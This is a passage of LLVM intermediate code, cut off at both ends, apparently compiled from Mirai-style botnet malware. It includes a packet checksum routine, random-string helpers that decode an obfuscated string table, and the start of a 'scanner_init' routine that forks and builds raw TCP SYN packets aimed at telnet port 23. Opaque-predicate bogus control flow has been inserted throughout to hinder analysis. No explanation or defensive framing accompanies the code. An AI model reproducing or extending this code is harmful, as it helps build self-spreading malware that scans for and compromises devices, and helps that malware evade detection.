  %50 = or i1 %48, %49
  br i1 %50, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %42
  %51 = load i16*, i16** %17, align 8
  %52 = load i16, i16* %51, align 2
  %53 = zext i16 %52 to i32
  %54 = load i32, i32* %20, align 4
  %55 = add i32 %54, %53
  store i32 %55, i32* %20, align 4
  %56 = load i16*, i16** %17, align 8
  %57 = getelementptr inbounds i16, i16* %56, i32 1
  store i16* %57, i16** %17, align 8
  %58 = load i32, i32* %16, align 4
  %59 = sub nsw i32 %58, 2
  store i32 %59, i32* %16, align 4
  %60 = load i32, i32* @x.45
  %61 = load i32, i32* @y.46
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBBpart218, label %originalBB1alteredBB

originalBBpart218:                                ; preds = %originalBB1
  br label %39

; <label>:68:                                     ; preds = %39
  %69 = load i32, i32* @x.45
  %70 = load i32, i32* @y.46
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %68
  %77 = load i32, i32* %16, align 4
  %78 = icmp eq i32 %77, 1
  %79 = load i32, i32* @x.45
  %80 = load i32, i32* @y.46
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBBpart222, label %originalBB20alteredBB

originalBBpart222:                                ; preds = %originalBB20
  br i1 %78, label %87, label %94

; <label>:87:                                     ; preds = %originalBBpart222
  %88 = load i16*, i16** %17, align 8
  %89 = bitcast i16* %88 to i8*
  %90 = load i8, i8* %89, align 1
  %91 = zext i8 %90 to i32
  %92 = load i32, i32* %20, align 4
  %93 = add i32 %92, %91
  store i32 %93, i32* %20, align 4
  br label %94

; <label>:94:                                     ; preds = %87, %originalBBpart222
  %95 = load i32, i32* %18, align 4
  %96 = lshr i32 %95, 16
  %97 = and i32 %96, 65535
  %98 = load i32, i32* %20, align 4
  %99 = add i32 %98, %97
  store i32 %99, i32* %20, align 4
  %100 = load i32, i32* %18, align 4
  %101 = and i32 %100, 65535
  %102 = load i32, i32* %20, align 4
  %103 = add i32 %102, %101
  store i32 %103, i32* %20, align 4
  %104 = load i32, i32* %19, align 4
  %105 = lshr i32 %104, 16
  %106 = and i32 %105, 65535
  %107 = load i32, i32* %20, align 4
  %108 = add i32 %107, %106
  store i32 %108, i32* %20, align 4
  %109 = load i32, i32* %19, align 4
  %110 = and i32 %109, 65535
  %111 = load i32, i32* %20, align 4
  %112 = add i32 %111, %110
  store i32 %112, i32* %20, align 4
  %113 = load %struct.iphdr*, %struct.iphdr** %13, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i32 0, i32 6
  %115 = load i8, i8* %114, align 1
  %116 = zext i8 %115 to i16
  %117 = call zeroext i16 @htons(i16 zeroext %116) #7
  %118 = zext i16 %117 to i32
  %119 = load i32, i32* %20, align 4
  %120 = add i32 %119, %118
  store i32 %120, i32* %20, align 4
  %121 = load i16, i16* %15, align 2
  %122 = zext i16 %121 to i32
  %123 = load i32, i32* %20, align 4
  %124 = add i32 %123, %122
  store i32 %124, i32* %20, align 4
  br label %125

; <label>:125:                                    ; preds = %129, %94
  %126 = load i32, i32* %20, align 4
  %127 = lshr i32 %126, 16
  %128 = icmp ne i32 %127, 0
  br i1 %128, label %129, label %135

; <label>:129:                                    ; preds = %125
  %130 = load i32, i32* %20, align 4
  %131 = and i32 %130, 65535
  %132 = load i32, i32* %20, align 4
  %133 = lshr i32 %132, 16
  %134 = add i32 %131, %133
  store i32 %134, i32* %20, align 4
  br label %125

; <label>:135:                                    ; preds = %125
  %136 = load i32, i32* %20, align 4
  %137 = xor i32 %136, -1
  %138 = trunc i32 %137 to i16
  ret i16 %138

originalBBalteredBB:                              ; preds = %originalBB, %4
  %139 = alloca %struct.iphdr*, align 8
  %140 = alloca i8*, align 8
  %141 = alloca i16, align 2
  %142 = alloca i32, align 4
  %143 = alloca i16*, align 8
  %144 = alloca i32, align 4
  %145 = alloca i32, align 4
  %146 = alloca i32, align 4
  %147 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %139, align 8
  store i8* %1, i8** %140, align 8
  store i16 %2, i16* %141, align 2
  store i32 %3, i32* %142, align 4
  %148 = load i8*, i8** %140, align 8
  %149 = bitcast i8* %148 to i16*
  store i16* %149, i16** %143, align 8
  %150 = load %struct.iphdr*, %struct.iphdr** %139, align 8
  %151 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %150, i32 0, i32 8
  %152 = load i32, i32* %151, align 4
  store i32 %152, i32* %144, align 4
  %153 = load %struct.iphdr*, %struct.iphdr** %139, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i32 0, i32 9
  %155 = load i32, i32* %154, align 4
  store i32 %155, i32* %145, align 4
  store i32 0, i32* %146, align 4
  %156 = load i32, i32* %142, align 4
  store i32 %156, i32* %147, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %42
  %157 = load i16*, i16** %17, align 8
  %158 = load i16, i16* %157, align 2
  %159 = zext i16 %158 to i32
  %160 = load i32, i32* %20, align 4
  %_ = sub i32 0, %160
  %gen = add i32 %_, %159
  %_2 = shl i32 %160, %159
  %_3 = sub i32 %160, %159
  %gen4 = mul i32 %_3, %159
  %_5 = sub i32 0, %160
  %gen6 = add i32 %_5, %159
  %_7 = sub i32 0, %160
  %gen8 = add i32 %_7, %159
  %_9 = sub i32 0, %160
  %gen10 = add i32 %_9, %159
  %_11 = shl i32 %160, %159
  %161 = add i32 %160, %159
  store i32 %161, i32* %20, align 4
  %162 = load i16*, i16** %17, align 8
  %163 = getelementptr inbounds i16, i16* %162, i32 1
  store i16* %163, i16** %17, align 8
  %164 = load i32, i32* %16, align 4
  %_12 = shl i32 %164, 2
  %_13 = shl i32 %164, 2
  %_14 = sub i32 0, %164
  %gen15 = add i32 %_14, 2
  %_16 = shl i32 %164, 2
  %165 = sub nsw i32 %164, 2
  store i32 %165, i32* %16, align 4
  br label %originalBB1

originalBB20alteredBB:                            ; preds = %originalBB20, %68
  %166 = load i32, i32* %16, align 4
  %167 = icmp eq i32 %166, 1
  br label %originalBB20
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = load i32, i32* @x.47
  %2 = load i32, i32* @y.48
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = load i32, i32* @x, align 4
  store i32 %10, i32* %9, align 4
  %11 = load i32, i32* %9, align 4
  %12 = shl i32 %11, 11
  %13 = load i32, i32* %9, align 4
  %14 = xor i32 %13, %12
  store i32 %14, i32* %9, align 4
  %15 = load i32, i32* %9, align 4
  %16 = lshr i32 %15, 8
  %17 = load i32, i32* %9, align 4
  %18 = xor i32 %17, %16
  store i32 %18, i32* %9, align 4
  %19 = load i32, i32* @y, align 4
  store i32 %19, i32* @x, align 4
  %20 = load i32, i32* @z, align 4
  store i32 %20, i32* @y, align 4
  %21 = load i32, i32* @w, align 4
  store i32 %21, i32* @z, align 4
  %22 = load i32, i32* @w, align 4
  %23 = lshr i32 %22, 19
  %24 = load i32, i32* @w, align 4
  %25 = xor i32 %24, %23
  store i32 %25, i32* @w, align 4
  %26 = load i32, i32* %9, align 4
  %27 = load i32, i32* @w, align 4
  %28 = xor i32 %27, %26
  store i32 %28, i32* @w, align 4
  %29 = load i32, i32* @w, align 4
  %30 = load i32, i32* @x.47
  %31 = load i32, i32* @y.48
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %29

originalBBalteredBB:                              ; preds = %originalBB, %0
  %38 = alloca i32, align 4
  %39 = load i32, i32* @x, align 4
  store i32 %39, i32* %38, align 4
  %40 = load i32, i32* %38, align 4
  %_ = shl i32 %40, 11
  %_1 = shl i32 %40, 11
  %_2 = shl i32 %40, 11
  %_3 = sub i32 %40, 11
  %gen = mul i32 %_3, 11
  %_4 = sub i32 %40, 11
  %gen5 = mul i32 %_4, 11
  %41 = shl i32 %40, 11
  %42 = load i32, i32* %38, align 4
  %_6 = sub i32 %42, %41
  %gen7 = mul i32 %_6, %41
  %_8 = shl i32 %42, %41
  %_9 = sub i32 0, %42
  %gen10 = add i32 %_9, %41
  %43 = xor i32 %42, %41
  store i32 %43, i32* %38, align 4
  %44 = load i32, i32* %38, align 4
  %_11 = sub i32 %44, 8
  %gen12 = mul i32 %_11, 8
  %45 = lshr i32 %44, 8
  %46 = load i32, i32* %38, align 4
  %_13 = sub i32 %46, %45
  %gen14 = mul i32 %_13, %45
  %_15 = sub i32 0, %46
  %gen16 = add i32 %_15, %45
  %_17 = shl i32 %46, %45
  %47 = xor i32 %46, %45
  store i32 %47, i32* %38, align 4
  %48 = load i32, i32* @y, align 4
  store i32 %48, i32* @x, align 4
  %49 = load i32, i32* @z, align 4
  store i32 %49, i32* @y, align 4
  %50 = load i32, i32* @w, align 4
  store i32 %50, i32* @z, align 4
  %51 = load i32, i32* @w, align 4
  %_18 = sub i32 %51, 19
  %gen19 = mul i32 %_18, 19
  %_20 = sub i32 0, %51
  %gen21 = add i32 %_20, 19
  %_22 = sub i32 0, %51
  %gen23 = add i32 %_22, 19
  %_24 = sub i32 %51, 19
  %gen25 = mul i32 %_24, 19
  %_26 = shl i32 %51, 19
  %52 = lshr i32 %51, 19
  %53 = load i32, i32* @w, align 4
  %_27 = shl i32 %53, %52
  %_28 = sub i32 %53, %52
  %gen29 = mul i32 %_28, %52
  %_30 = sub i32 0, %53
  %gen31 = add i32 %_30, %52
  %54 = xor i32 %53, %52
  store i32 %54, i32* @w, align 4
  %55 = load i32, i32* %38, align 4
  %56 = load i32, i32* @w, align 4
  %_32 = sub i32 %56, %55
  %gen33 = mul i32 %_32, %55
  %_34 = sub i32 %56, %55
  %gen35 = mul i32 %_34, %55
  %_36 = sub i32 %56, %55
  %gen37 = mul i32 %_36, %55
  %_38 = sub i32 %56, %55
  %gen39 = mul i32 %_38, %55
  %_40 = sub i32 %56, %55
  %gen41 = mul i32 %_40, %55
  %57 = xor i32 %56, %55
  store i32 %57, i32* @w, align 4
  %58 = load i32, i32* @w, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @rand_str(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  br label %5

; <label>:5:                                      ; preds = %originalBBpart210, %2
  %6 = load i32, i32* %4, align 4
  %7 = icmp sgt i32 %6, 0
  br i1 %7, label %8, label %94

; <label>:8:                                      ; preds = %5
  %9 = load i32, i32* @x.49
  %10 = load i32, i32* @y.50
  %11 = sub i32 %9, 1
  %12 = mul i32 %9, %11
  %13 = urem i32 %12, 2
  %14 = icmp eq i32 %13, 0
  %15 = icmp slt i32 %10, 10
  %16 = or i1 %14, %15
  br i1 %16, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %8
  %17 = load i32, i32* %4, align 4
  %18 = icmp sge i32 %17, 4
  %19 = load i32, i32* @x.49
  %20 = load i32, i32* @y.50
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %18, label %27, label %53

; <label>:27:                                     ; preds = %originalBBpart2
  %28 = load i32, i32* @x.49
  %29 = load i32, i32* @y.50
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %27
  %36 = call i32 @rand_next()
  %37 = load i8*, i8** %3, align 8
  %38 = bitcast i8* %37 to i32*
  store i32 %36, i32* %38, align 4
  %39 = load i8*, i8** %3, align 8
  %40 = getelementptr inbounds i8, i8* %39, i64 4
  store i8* %40, i8** %3, align 8
  %41 = load i32, i32* %4, align 4
  %42 = sext i32 %41 to i64
  %43 = sub i64 %42, 4
  %44 = trunc i64 %43 to i32
  store i32 %44, i32* %4, align 4
  %45 = load i32, i32* @x.49
  %46 = load i32, i32* @y.50
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBBpart26, label %originalBB1alteredBB

originalBBpart26:                                 ; preds = %originalBB1
  br label %77

; <label>:53:                                     ; preds = %originalBBpart2
  %54 = load i32, i32* %4, align 4
  %55 = icmp sge i32 %54, 2
  br i1 %55, label %56, label %68

; <label>:56:                                     ; preds = %53
  %57 = call i32 @rand_next()
  %58 = and i32 %57, 65535
  %59 = trunc i32 %58 to i16
  %60 = load i8*, i8** %3, align 8
  %61 = bitcast i8* %60 to i16*
  store i16 %59, i16* %61, align 2
  %62 = load i8*, i8** %3, align 8
  %63 = getelementptr inbounds i8, i8* %62, i64 2
  store i8* %63, i8** %3, align 8
  %64 = load i32, i32* %4, align 4
  %65 = sext i32 %64 to i64
  %66 = sub i64 %65, 2
  %67 = trunc i64 %66 to i32
  store i32 %67, i32* %4, align 4
  br label %76

; <label>:68:                                     ; preds = %53
  %69 = call i32 @rand_next()
  %70 = and i32 %69, 255
  %71 = trunc i32 %70 to i8
  %72 = load i8*, i8** %3, align 8
  %73 = getelementptr inbounds i8, i8* %72, i32 1
  store i8* %73, i8** %3, align 8
  store i8 %71, i8* %72, align 1
  %74 = load i32, i32* %4, align 4
  %75 = add nsw i32 %74, -1
  store i32 %75, i32* %4, align 4
  br label %76

; <label>:76:                                     ; preds = %68, %56
  br label %77

; <label>:77:                                     ; preds = %76, %originalBBpart26
  %78 = load i32, i32* @x.49
  %79 = load i32, i32* @y.50
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBB8, label %originalBB8alteredBB

originalBB8:                                      ; preds = %originalBB8alteredBB, %77
  %86 = load i32, i32* @x.49
  %87 = load i32, i32* @y.50
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBBpart210, label %originalBB8alteredBB

originalBBpart210:                                ; preds = %originalBB8
  br label %5

; <label>:94:                                     ; preds = %5
  %95 = load i32, i32* @x.49
  %96 = load i32, i32* @y.50
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %94
  %103 = load i32, i32* @x.49
  %104 = load i32, i32* @y.50
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBBpart214, label %originalBB12alteredBB

originalBBpart214:                                ; preds = %originalBB12
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %8
  %111 = load i32, i32* %4, align 4
  %112 = icmp sge i32 %111, 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %27
  %113 = call i32 @rand_next()
  %114 = load i8*, i8** %3, align 8
  %115 = bitcast i8* %114 to i32*
  store i32 %113, i32* %115, align 4
  %116 = load i8*, i8** %3, align 8
  %117 = getelementptr inbounds i8, i8* %116, i64 4
  store i8* %117, i8** %3, align 8
  %118 = load i32, i32* %4, align 4
  %119 = sext i32 %118 to i64
  %_ = shl i64 %119, 4
  %_2 = sub i64 %119, 4
  %gen = mul i64 %_2, 4
  %_3 = sub i64 0, %119
  %gen4 = add i64 %_3, 4
  %120 = sub i64 %119, 4
  %121 = trunc i64 %120 to i32
  store i32 %121, i32* %4, align 4
  br label %originalBB1

originalBB8alteredBB:                             ; preds = %originalBB8, %77
  br label %originalBB8

originalBB12alteredBB:                            ; preds = %originalBB12, %94
  br label %originalBB12
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alpha_str(i8*, i32) #0 {
  %3 = load i32, i32* @x.51
  %4 = load i32, i32* @y.52
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca [32 x i8], align 16
  store i8* %0, i8** %11, align 8
  store i32 %1, i32* %12, align 4
  call void @table_unlock_val(i8 zeroext 28)
  %14 = getelementptr inbounds [32 x i8], [32 x i8]* %13, i32 0, i32 0
  %15 = call i8* @table_retrieve_val(i32 28, i32* null)
  %16 = call i8* @strcpy(i8* %14, i8* %15) #6
  %17 = load i32, i32* @x.51
  %18 = load i32, i32* @y.52
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %25

; <label>:25:                                     ; preds = %29, %originalBBpart2
  %26 = load i32, i32* %12, align 4
  %27 = add nsw i32 %26, -1
  store i32 %27, i32* %12, align 4
  %28 = icmp ne i32 %26, 0
  br i1 %28, label %29, label %39

; <label>:29:                                     ; preds = %25
  %30 = call i32 @rand_next()
  %31 = getelementptr inbounds [32 x i8], [32 x i8]* %13, i32 0, i32 0
  %32 = call i32 @util_strlen(i8* %31)
  %33 = urem i32 %30, %32
  %34 = zext i32 %33 to i64
  %35 = getelementptr inbounds [32 x i8], [32 x i8]* %13, i64 0, i64 %34
  %36 = load i8, i8* %35, align 1
  %37 = load i8*, i8** %11, align 8
  %38 = getelementptr inbounds i8, i8* %37, i32 1
  store i8* %38, i8** %11, align 8
  store i8 %36, i8* %37, align 1
  br label %25

; <label>:39:                                     ; preds = %25
  %40 = load i32, i32* @x.51
  %41 = load i32, i32* @y.52
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %39
  call void @table_lock_val(i8 zeroext 28)
  %48 = load i32, i32* @x.51
  %49 = load i32, i32* @y.52
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %56 = alloca i8*, align 8
  %57 = alloca i32, align 4
  %58 = alloca [32 x i8], align 16
  store i8* %0, i8** %56, align 8
  store i32 %1, i32* %57, align 4
  call void @table_unlock_val(i8 zeroext 28)
  %59 = getelementptr inbounds [32 x i8], [32 x i8]* %58, i32 0, i32 0
  %60 = call i8* @table_retrieve_val(i32 28, i32* null)
  %61 = call i8* @strcpy(i8* %59, i8* %60) #6
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %39
  call void @table_lock_val(i8 zeroext 28)
  br label %originalBB1
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @scanner_init() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i16, align 2
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.fd_set.26, align 8
  %6 = alloca %struct.fd_set.26, align 8
  %7 = alloca %struct.scanner_connection*, align 8
  %8 = alloca %struct.timeval.27, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca %struct.iphdr*, align 8
  %16 = alloca %struct.tcphdr*, align 8
  %17 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %18 = alloca i32, align 4
  %19 = alloca [1514 x i8], align 16
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.tcphdr*, align 8
  %22 = alloca %struct.scanner_connection*, align 8
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i8*, align 8
  %35 = alloca i32, align 4
  %36 = alloca i8*, align 8
  %37 = alloca i32, align 4
  %38 = alloca i8*, align 8
  %39 = alloca i32, align 4
  %40 = alloca i8*, align 8
  %41 = alloca i32, align 4
  %42 = alloca i8*, align 8
  %43 = alloca i32, align 4
  %44 = alloca i8*, align 8
  %45 = alloca i32, align 4
  %46 = call i32 @fork() #6
  store i32 %46, i32* @scanner_pid, align 4
  %47 = load i32, i32* @scanner_pid, align 4
  %48 = icmp sgt i32 %47, 0
  br i1 %48, label %52, label %49

; <label>:49:                                     ; preds = %0
  %50 = load i32, i32* @scanner_pid, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %49, %0
  ret void

; <label>:53:                                     ; preds = %49
  %54 = call i32 @util_local_addr()
  store i32 %54, i32* @LOCAL_ADDR, align 4
  call void @rand_init()
  %55 = call i64 @time(i64* null) #6
  %56 = trunc i64 %55 to i32
  store i32 %56, i32* @fake_time, align 4
  %57 = call noalias i8* @calloc(i64 256, i64 296) #6
  %58 = bitcast i8* %57 to %struct.scanner_connection*
  store %struct.scanner_connection* %58, %struct.scanner_connection** @conn_table, align 8
  store i32 0, i32* %1, align 4
  br label %59

; <label>:59:                                     ; preds = %73, %53
  %60 = load i32, i32* %1, align 4
  %61 = icmp slt i32 %60, 256
  br i1 %61, label %62, label %76

; <label>:62:                                     ; preds = %59
  %63 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %64 = load i32, i32* %1, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %63, i64 %65
  %67 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %66, i32 0, i32 3
  store i32 0, i32* %67, align 8
  %68 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %69 = load i32, i32* %1, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %68, i64 %70
  %72 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %71, i32 0, i32 1
  store i32 -1, i32* %72, align 8
  br label %73

; <label>:73:                                     ; preds = %62
  %74 = load i32, i32* %1, align 4
  %75 = add nsw i32 %74, 1
  store i32 %75, i32* %1, align 4
  br label %59

; <label>:76:                                     ; preds = %59
  %77 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %77, i32* @rsck, align 4
  %78 = icmp eq i32 %77, -1
  br i1 %78, label %79, label %80

; <label>:79:                                     ; preds = %76
  call void @exit(i32 0) #8
  unreachable

; <label>:80:                                     ; preds = %76
  %81 = load i32, i32* @x.53
  %82 = load i32, i32* @y.54
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %80
  %89 = load i32, i32* @rsck, align 4
  %90 = load i32, i32* @rsck, align 4
  %91 = call i32 (i32, i32, ...) @fcntl(i32 %90, i32 3, i32 0)
  %92 = or i32 2048, %91
  %93 = call i32 (i32, i32, ...) @fcntl(i32 %89, i32 4, i32 %92)
  store i32 1, i32* %1, align 4
  %94 = load i32, i32* @rsck, align 4
  %95 = bitcast i32* %1 to i8*
  %96 = call i32 @setsockopt(i32 %94, i32 0, i32 3, i8* %95, i32 4) #6
  %97 = icmp ne i32 %96, 0
  %98 = load i32, i32* @x.53
  %99 = load i32, i32* @y.54
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %97, label %106, label %109

; <label>:106:                                    ; preds = %originalBBpart2
  %107 = load i32, i32* @rsck, align 4
  %108 = call i32 @close(i32 %107)
  call void @exit(i32 0) #8
  unreachable

; <label>:109:                                    ; preds = %originalBBpart2
  %110 = load i32, i32* @x.53
  %111 = load i32, i32* @y.54
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %109
  %118 = load i32, i32* @x.53
  %119 = load i32, i32* @y.54
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %126

; <label>:126:                                    ; preds = %130, %originalBBpart28
  %127 = call i32 @rand_next()
  %128 = and i32 %127, 65535
  %129 = trunc i32 %128 to i16
  store i16 %129, i16* %2, align 2
  br label %130

; <label>:130:                                    ; preds = %126
  %131 = load i16, i16* %2, align 2
  %132 = call zeroext i16 @ntohs(i16 zeroext %131) #7
  %133 = zext i16 %132 to i32
  %134 = icmp slt i32 %133, 1024
  br i1 %134, label %126, label %135

; <label>:135:                                    ; preds = %130
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %3, align 8
  %136 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %137 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %136, i64 1
  %138 = bitcast %struct.iphdr* %137 to %struct.tcphdr*
  store %struct.tcphdr* %138, %struct.tcphdr** %4, align 8
  %139 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %140 = bitcast %struct.iphdr* %139 to i8*
  %141 = load i8, i8* %140, align 4
  %142 = and i8 %141, -16
  %143 = or i8 %142, 5
  store i8 %143, i8* %140, align 4
  %144 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %145 = bitcast %struct.iphdr* %144 to i8*
  %146 = load i8, i8* %145, align 4
  %147 = and i8 %146, 15
  %148 = or i8 %147, 64
  store i8 %148, i8* %145, align 4
  %149 = call zeroext i16 @htons(i16 zeroext 40) #7
  %150 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %151 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %150, i32 0, i32 2
  store i16 %149, i16* %151, align 2
  %152 = call i32 @rand_next()
  %153 = trunc i32 %152 to i16
  %154 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %155 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %154, i32 0, i32 3
  store i16 %153, i16* %155, align 4
  %156 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i32 0, i32 5
  store i8 64, i8* %157, align 4
  %158 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %159 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %158, i32 0, i32 6
  store i8 6, i8* %159, align 1
  %160 = call zeroext i16 @htons(i16 zeroext 23) #7
  %161 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
